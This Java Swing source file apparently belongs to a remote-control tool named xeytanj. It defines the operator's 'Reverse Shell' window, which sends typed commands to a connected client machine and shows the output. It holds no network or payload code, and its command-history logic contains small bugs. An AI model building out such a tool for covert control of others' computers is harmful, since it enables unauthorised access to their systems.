package com.melardev.xeytanj.gui.shell;


import com.melardev.xeytanj.enums.ServiceType;
import com.melardev.xeytanj.gui.IGuiUserOwned;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.models.Client;
import com.melardev.xeytanj.services.IAppMessageProvider;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.text.DefaultCaret;
import java.awt.*;
import java.awt.event.*;
import java.util.ArrayList;
import java.util.UUID;

public class ShellGUI extends JFrame implements IGuiUserOwned<ShellUiListener> {

    private JScrollPane scrollCmd;
    private JTextField txtCmd;
    private JTextArea txtResults;
    private ArrayList<String> historyCmd;
    private int cursorHistory;
    private ShellUiListener listener;
    private IUiMediator mediator;
    private UUID id;
    private IAppMessageProvider messageProvider;
    private Client client;

    public ShellGUI() {


    }

    protected void onSendTrigger() {
        getMediator().onSendShellCommandRequested(getClient(), txtCmd.getText());
        historyCmd.add(txtCmd.getText());
        if (txtCmd.getText() != "") {
            cursorHistory++;
            historyCmd.add(txtCmd.getText());
        }
        txtCmd.setText("");
    }

    public void appendText(String results) {
        txtResults.append(results);
    }

    @Override
    public void display() {
        historyCmd = new ArrayList<String>();
        cursorHistory = 0;
        txtResults = new JTextArea();
        txtResults.setEditable(false);
        JScrollPane scrollResults = new JScrollPane(txtResults);
        DefaultCaret caret = (DefaultCaret) txtResults.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);

        JButton btnSend = new JButton("Send");
        btnSend.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent args) {
                onSendTrigger();
            }
        });
        txtCmd = new JTextField();
        scrollCmd = new JScrollPane(txtCmd);
        GroupLayout groupLayout = new GroupLayout(getContentPane());
        groupLayout
                .setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
                        .addGroup(groupLayout.createSequentialGroup()
                                .addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
                                        .addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(
                                                scrollResults, GroupLayout.DEFAULT_SIZE, 948, Short.MAX_VALUE))
                                        .addGroup(groupLayout.createSequentialGroup().addGap(14)
                                                .addComponent(scrollCmd, GroupLayout.DEFAULT_SIZE, 832, Short.MAX_VALUE)
                                                .addPreferredGap(ComponentPlacement.RELATED)
                                                .addComponent(btnSend, GroupLayout.PREFERRED_SIZE, 106, GroupLayout.PREFERRED_SIZE)))
                                .addContainerGap()));
        groupLayout
                .setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING)
                        .addGroup(groupLayout.createSequentialGroup().addContainerGap()
                                .addComponent(scrollResults, GroupLayout.DEFAULT_SIZE, 495, Short.MAX_VALUE).addGap(18)
                                .addGroup(groupLayout.createParallelGroup(Alignment.TRAILING, false)
                                        .addComponent(btnSend, GroupLayout.PREFERRED_SIZE, 77,
                                                GroupLayout.PREFERRED_SIZE)
                                        .addComponent(scrollCmd, GroupLayout.PREFERRED_SIZE, 77, GroupLayout.PREFERRED_SIZE))
                                .addContainerGap()));
        getContentPane().setLayout(groupLayout);

        txtCmd.addKeyListener(new KeyAdapter() {

            @Override
            public void keyPressed(KeyEvent e) {
                super.keyPressed(e);
                if (e.getKeyCode() == KeyEvent.VK_UP) {
                    cursorHistory = cursorHistory > 1 ? cursorHistory-- : 0;
                    txtCmd.setText(historyCmd.get(cursorHistory));
                } else if (e.getKeyCode() == KeyEvent.VK_DOWN) {
                    if (cursorHistory >= historyCmd.size() - 1)
                        cursorHistory++;
                    txtCmd.setText(historyCmd.get(cursorHistory));
                }
                if (e.getKeyCode() == KeyEvent.VK_ENTER) {
                    onSendTrigger();
                }
            }

        });

        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                super.windowClosing(e);
                notifyMediatorOnClose();
            }
        });

        pack();
        setVisible(true);

    }

    @Override
    public void addListener(ShellUiListener shellUiListener) {
        this.listener = shellUiListener;
    }

    @Override
    public ShellUiListener getListener() {
        return null;
    }

    @Override
    public IUiMediator getMediator() {
        return mediator;
    }

    @Override
    public void setMediator(IUiMediator mediator) {
        this.mediator = mediator;
    }

    @Override
    public void resetState() {
    }

    @Override
    public Client getClient() {
        return client;
    }

    @Override
    public void setClient(Client client) {
        this.client = client;
        setTitle("Reverse Shell - " + client.getPcName());
    }

    @Override
    public ServiceType getServiceType() {
        return ServiceType.REVERSE_SHELL;
    }

    @Override
    public void setStatus(String status) {

    }

    @Override
    public void disableUi() {
        setEnabled(false);
    }

    public void notifyDisconnected() {
        txtResults.append("User is Disconnected\n");
        txtResults.setBackground(Color.GRAY);
    }

    @Override
    public void setMessageProvider(IAppMessageProvider messageProvider) {
        this.messageProvider = messageProvider;
    }

}
